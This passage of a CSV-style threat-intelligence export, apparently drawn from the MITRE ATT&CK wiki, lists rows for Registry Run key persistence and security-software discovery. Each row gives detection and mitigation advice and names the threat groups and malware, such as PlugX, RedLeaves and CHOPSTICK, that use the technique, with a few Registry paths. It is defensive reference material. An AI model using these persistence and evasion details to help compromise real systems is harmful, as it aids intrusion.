Folder'],https://attack.mitre.org/wiki/Technique/T1060
1200,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Group/G0032|Lazarus Group]] malware RomeoAlfa maintains persistence by saving itself in the Start menu folder.[[CiteRef::Novetta Blockbuster RATs]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1201,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0013|PlugX]] can add a Run key entry in the Registry to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: PlugX, Sogu, Kaba",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1202,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0013|PlugX]] can add a Run key entry in the Registry to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: PlugX, Sogu, Kaba",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1203,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0144|ChChes]] establishes persistence by adding a Registry Run key.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: ChChes, Scorpion, HAYMAKER",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1204,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0152|EvilGrab]] adds a Registry Run key for ctfmon.exe to establish persistence.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: EvilGrab,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1205,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['[[Software/S0153|RedLeaves]] attempts to add a shortcut file in the Startup folder to achieve persistence; if this fails, it attempts to add Registry Run keys.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: RedLeaves, BUGJUICE",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1206,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0159|SNUGRIDE]] establishes persistence through a Registry Run key.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SNUGRIDE,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1207,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0062|DustySky]] achieves persistence by creating a Registry entry in <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: DustySky, NeD Worm",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1208,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Group/G0040|Patchwork]] added the path of its second-stage malware to the startup folder to achieve persistence.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1209,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0013|PlugX]] can add a Run key entry in the Registry to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: PlugX, Sogu, Kaba",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1210,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",[u'[[Software/S0070|HTTPBrowser]] has established persistence by setting the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key value for <code>wdm</code> to the path of the executable.[[CiteRef::ThreatStream Evasion Analysis]] It has also used the Registry entry <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \u201c%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\u201d</code> to establish persistence.[[CiteRef::ZScaler Hacking Team]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: HTTPBrowser, Token Control, HttpDump",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1211,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0108|netsh]] can be used to discover system firewall settings.[[CiteRef::TechNet Netsh Firewall]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: netsh, netsh.exe",['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1212,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to enumerate security software currently running on a system by process name of known products.[[CiteRef::Microsoft Tasklist]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1213,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0142|StreamEx]] has the ability to scan for security tools such as firewalls and antivirus tools.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: StreamEx,['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1214,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0125|Remsec]] has a plugin to detect active drivers of some security products.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1215,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to enumerate security software currently running on a system by process name of known products.[[CiteRef::Microsoft Tasklist]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: Tasklist,['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1216,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0023|CHOPSTICK]] checks for anti-virus, forensics, and virtualization software.[[CiteRef::FireEye APT28]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],"Software: CHOPSTICK, SPLM, ...",['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1217,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0148|RTM]] can obtain information about security software on the victim.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],Software: RTM,['Discovery'],['Technique/T1063'],['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1218,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to enumerate security software currently running on a system by process name of known products.[[CiteRef::Microsoft Tasklist]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 